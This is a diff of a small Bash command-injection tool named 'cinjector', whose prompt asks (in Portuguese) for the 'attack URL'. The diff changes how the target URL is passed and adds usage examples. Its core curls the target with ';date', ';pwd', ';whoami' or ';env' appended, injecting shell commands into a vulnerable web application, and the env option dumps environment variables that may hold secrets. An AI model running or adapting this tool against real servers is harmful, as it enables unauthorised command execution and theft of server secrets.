@@ -17,25 +17,33 @@ Y88b  d88P  888   888  888  888 Y8b.     Y88b.    Y88b. Y88..88P 888
 
 
 "
-sleep 1s
-read -p "Qual a URL do ataque? " URL
+sleep 2s
+#read -p "Qual a URL do ataque? " URL
 if [[ $1 == "-h" ]] || [[ $1 == "--help" ]];then
-        echo "All of the commands"
+        echo "Usage"
+        echo "------------------------------"
+        echo "    -u url to attack"
+        echo "Commands"
         echo "------------------------------"
         echo "    -d date"
         echo "    -w whoami"
         echo "    -p pwd"
         echo "    -e env"
         echo "------------------------------"
-elif [[ $1 == "-d" ]];then
-        curl "$URL;date"
-elif [[ $1 == "-p" ]];then
-        curl "$URL;pwd"
-elif [[ $1 == "-w" ]];then
-        curl "$URL;whoami"
-elif [[ $1 == "-e" ]];then
-        curl "$URL;env"
+        echo "Example"
+        echo "./cinjector -u <url> -p"
+        echo "./cinjector -u <url> -w"
+        echo "------------------------------"
+
+elif [[ $1 == "-u" ]] && [[ $3 == "-d" ]];then
+        curl "$2;date"
+elif [[ $1 == "-u" ]] && [[ $3 == "-p" ]];then
+        curl "$2;pwd"
+elif [[ $1 == "-u" ]] && [[ $3 == "-w" ]];then
+        curl "$2;whoami"
+elif [[ $1 == "-u" ]] && [[ $3 == "-e" ]];then
+        curl "$2;env"
 else
         echo "If you need help type -h or --help"
-        echo "Usage ./cinjector.sh -h"
+        echo "Usage ./resolve.sh -u <url> -p"
 fi
